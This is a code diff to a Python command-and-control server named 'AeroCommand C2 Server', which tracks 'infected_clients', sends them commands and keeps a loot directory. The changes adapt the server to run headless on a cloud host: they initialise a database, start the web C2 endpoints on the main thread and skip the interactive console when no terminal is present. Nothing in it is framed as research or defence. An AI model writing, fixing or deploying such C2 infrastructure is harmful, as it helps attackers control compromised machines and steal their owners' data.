@@ -514,7 +514,10 @@ def input_thread_func():
                     info = infected_clients.get(target_client, {})
                     print(f"{C.GREEN}[→] Command sent to {info.get('host', target_client)}{C.RESET}")
 
-        except (EOFError, KeyboardInterrupt):
+        except EOFError:
+            # Headless environment (Render/Cloud) - STDIN closed, stop input loop gracefully
+            break
+        except KeyboardInterrupt:
             print(f"\n{C.RED}[!] Shutting down...{C.RESET}")
             os._exit(0)
         except Exception as e:
@@ -523,29 +526,26 @@ def input_thread_func():
 
 
 if __name__ == "__main__":
-    # Create loot directory
+    # Ensure database and loot directory are ready
+    init_db()
     os.makedirs(LOOT_DIR, exist_ok=True)
 
     # Read port from environment variable (Render sets $PORT, defaults to 443 locally)
     server_port = int(os.environ.get("PORT", 443))
+    print(f"{C.GREEN}[+] AeroCommand C2 Server starting on port {server_port}...{C.RESET}")
 
-    # Start Flask in daemon thread
-    flask_thread = threading.Thread(
-        target=lambda: app.run(host="0.0.0.0", port=server_port, debug=False, use_reloader=False)
-    )
-    flask_thread.daemon = True
-    flask_thread.start()
-
-    # Start heartbeat monitor
+    # Start heartbeat monitor in background daemon thread
     heartbeat_thread = threading.Thread(target=heartbeat_monitor)
     heartbeat_thread.daemon = True
     heartbeat_thread.start()
 
-    # Start input thread
-    input_thread = threading.Thread(target=input_thread_func)
-    input_thread.daemon = True
-    input_thread.start()
+    # Start interactive input console ONLY if running in an interactive terminal (local TTY)
+    if sys.stdin and sys.stdin.isatty():
+        input_thread = threading.Thread(target=input_thread_func)
+        input_thread.daemon = True
+        input_thread.start()
+    else:
+        print(f"{C.CYAN}[i] Cloud/Headless mode detected (no TTY) — Web C2 endpoints are active.{C.RESET}")
 
-    # Keep main thread alive
-    while True:
-        threading.Event().wait(1)
+    # Run Flask on main thread (keeps web service alive and healthy on Render/cloud)
+    app.run(host="0.0.0.0", port=server_port, debug=False, use_reloader=False)
